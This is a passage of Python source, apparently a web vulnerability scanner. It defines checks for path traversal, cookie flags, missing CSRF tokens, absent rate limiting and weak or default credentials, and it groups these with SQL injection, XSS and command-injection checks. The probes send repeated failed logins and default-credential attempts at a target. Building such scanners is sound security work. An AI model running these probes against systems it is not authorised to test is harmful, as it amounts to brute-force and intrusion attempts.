                            return [self._finding("Path traversal in file download", "high", "certain", f"The file/path parameter at {path}?{k}={payload} accepts relative traversal sequences and returns arbitrary file content.", "server", "CWE-22", "Validate and sanitize the file parameter, use an allowlist of filenames and never accept user-controlled paths.", [f"GET {path}?{k}={payload}", "Confirm arbitrary file content is returned"])]
        return []

    def check_cookie_flags(self) -> list[Finding]:
        """Inspect the session cookie for HttpOnly, Secure and SameSite flags."""
        if not self._last_login_response:
            self._user_session() or self._admin_session()
        if not self._last_login_response:
            return []
        sc = self._last_login_response.headers.get("set-cookie", "")
        missing = [f for f in ("HttpOnly","Secure","SameSite") if f not in sc]
        if not missing:
            return []
        return [self._finding("Session cookie missing security flags", "medium", "certain", f"The session cookie returned after login is missing the following security attributes: {', '.join(missing)}.", "client", "CWE-1004", "Set HttpOnly, Secure and SameSite=Strict attributes on session cookies.", ["Authenticate to the application", "Inspect the Set-Cookie response header", "Verify HttpOnly, Secure and SameSite are present"])]

    def check_csrf(self) -> list[Finding]:
        """Check all POST forms for anti-CSRF tokens."""
        self._ensure_crawl()
        post_forms = [f for f in self._forms if f["method"] == "POST"]
        if not post_forms:
            return []
        missing: list[str] = []
        for form in post_forms:
            if not any(inp["name"].lower() in _CSRF_NAMES for inp in form["inputs"]):
                missing.append(form["page_path"] or form["action"])
        if not missing:
            return []
        return [self._finding("Missing CSRF protection", "medium", "certain", "POST forms are missing anti-CSRF tokens, allowing attackers to forge cross-site requests on behalf of authenticated users.", "client", "CWE-352", "Add cryptographically random CSRF tokens to all state-changing forms and validate them server-side.", ["Inspect the source of state-changing forms", f"Affected forms/pages: {', '.join(missing[:10])}", "Verify absence of csrf_token or similar hidden input"])]

    def check_rate_limit(self) -> list[Finding]:
        """Send repeated failed authentication attempts and look for throttling."""
        self._ensure_crawl()
        forms = [f for f in self._login_forms() if f.get("is_login") and not f.get("is_register")]
        if not forms:
            return []
        blocked = False
        for form in forms:
            for _ in range(15):
                resp = self._try_login(form, f"ratelimit_{uuid.uuid4().hex[:8]}", "wrongpassword")
                if resp.status_code == 429 or any(m in resp.text.lower() for m in ("too many requests","rate limit exceeded","account locked","try again later","attempts exceeded","captcha","brute-force","temporary lock")):
                    blocked = True
                    break
                time.sleep(0.05)
            if blocked:
                break
        if blocked:
            return []
        return [self._finding("No rate limiting on authentication", "medium", "certain", "Sending repeated failed login requests did not trigger throttling, lockout or CAPTCHA, enabling brute-force attacks.", "client", "CWE-307", "Implement account lockout, exponential backoff and/or CAPTCHA after repeated failed authentication attempts.", ["POST failed login requests repeatedly", "Observe that all requests return 200/302 without a block", "Confirm no CAPTCHA or lockout message is shown"])]

    def check_weak_credentials(self) -> list[Finding]:
        """Test discovered login/admin forms for weak/default credentials."""
        self._ensure_crawl()
        findings: list[Finding] = []
        for item in self._find_default_creds():
            form, user, pw = item["form"], item["username"], item["password"]
            findings.append(self._finding("Weak/default credentials", "high", "certain", f"The login form at {form['action']} can be accessed with the weak/default credentials {user}/{pw}.", "server", "CWE-798", "Enforce strong unique passwords, remove default accounts and enable multi-factor authentication.", [f"Identify the login form at {form['action']}", f"Authenticate with {user}/{pw}", "Verify privileged functionality is accessible"]))
        return findings

    def check_default_admin_creds_iot(self) -> list[Finding]:
        """Surface default/weak admin credentials as an IoT/management finding."""
        self._ensure_crawl()
        findings: list[Finding] = []
        for item in self._find_default_creds():
            form, user, pw = item["form"], item["username"], item["password"]
            if form["is_admin_login"] or "admin" in form["page_path"].lower() or "admin" in form["action"].lower():
                findings.append(self._finding("Default/weak management credentials", "high", "certain", f"The management/admin interface at {form['action']} is reachable with default credentials ({user}/{pw}).", "iot", "CWE-798", "Change all default credentials, enforce password complexity and disable remote management interfaces where unnecessary.", [f"Identify the management login form at {form['action']}", f"Authenticate with {user}/{pw}", "Confirm administrative access is granted"]))
        return findings

    def scan_client(self) -> list[Finding]:
        findings: list[Finding] = []
        for m in (self.check_sqli_login_bypass, self.check_sqli_search_union, self.check_xss_reflected, self.check_xss_stored, self.check_idor, self.check_csrf, self.check_cookie_flags, self.check_rate_limit):
            findings.extend(m())
        return findings

    def scan_server(self) -> list[Finding]:
        findings: list[Finding] = []
        for m in (self.check_exposed_backup, self.check_exposed_api_patients, self.check_exposed_secret_file, self.check_debug_rce, self.check_weak_credentials, self.check_path_traversal, self.check_command_injection):
            findings.extend(m())
        return findings

    def scan_iot(self) -> list[Finding]:
        return list(self.check_default_admin_creds_iot())
